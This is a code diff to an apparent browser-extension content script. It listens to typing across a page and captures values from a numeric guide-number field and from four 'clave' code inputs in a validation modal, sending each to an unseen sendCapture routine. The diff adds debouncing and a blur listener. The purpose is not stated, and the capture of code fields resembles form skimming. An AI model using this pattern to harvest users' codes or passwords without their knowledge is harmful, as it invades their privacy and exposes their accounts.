@@ -5,6 +5,7 @@ const OS_INPUT_ID = 'inputnroguia';
 const CLAVE_FIELDS = ['swal-input1', 'swal-input2', 'swal-input3', 'swal-input4'];
 const CLAVE_MODAL_ID = 'modalValidarCodigo';
 const DEDUPE_WINDOW_MS = 1500;
+const OS_DEBOUNCE_MS = 650;
 
 function getContentState() {
     const globalState = globalThis[CONTENT_STATE_KEY] || {};
@@ -115,8 +116,45 @@ function captureDocument(target, source, eventTimeStamp) {
 
 function captureOs(target, source, eventTimeStamp) {
     const value = normalizeText(getFieldValue(target));
-    if (!/^\d+$/.test(value)) return;
+    if (!/^\d+$/.test(value) || value.length > 8) return null;
     sendCapture('OS', value, source, eventTimeStamp);
+    return value;
+}
+
+function getOsDebounceKey(source) {
+    return ['os', source].join('|');
+}
+
+function clearOsDebounce(state, source) {
+    const key = getOsDebounceKey(source);
+    const timer = state.osDebounceTimers?.[key];
+    if (timer) {
+        clearTimeout(timer);
+        delete state.osDebounceTimers[key];
+    }
+}
+
+function saveOsFinalValue(target, source, eventTimeStamp) {
+    const state = getContentState();
+    const value = captureOs(target, source, eventTimeStamp);
+    if (!value) {
+        clearOsDebounce(state, source);
+        return;
+    }
+
+    clearOsDebounce(state, source);
+}
+
+function scheduleOsDebouncedSave(target, source, eventTimeStamp) {
+    const state = getContentState();
+    state.osDebounceTimers ||= {};
+    const key = getOsDebounceKey(source);
+
+    clearOsDebounce(state, source);
+    state.osDebounceTimers[key] = setTimeout(() => {
+        delete state.osDebounceTimers[key];
+        saveOsFinalValue(target, source, eventTimeStamp);
+    }, OS_DEBOUNCE_MS);
 }
 
 function captureClave(target, source, eventTimeStamp) {
@@ -180,7 +218,13 @@ function handleCapture(event) {
     }
 
     if (isOsField(target)) {
-        captureOs(target, source, event.timeStamp);
+        if (event.type === 'input') {
+            scheduleOsDebouncedSave(target, source, event.timeStamp);
+            return;
+        }
+
+        clearOsDebounce(getContentState(), source);
+        saveOsFinalValue(target, source, event.timeStamp);
         return;
     }
 
@@ -195,6 +239,7 @@ function ensureDocumentListener() {
     state.documentListenerAttached = true;
     document.addEventListener('input', handleCapture, true);
     document.addEventListener('change', handleCapture, true);
+    document.addEventListener('blur', handleCapture, true);
 }
 
 function ensureMutationObserver() {
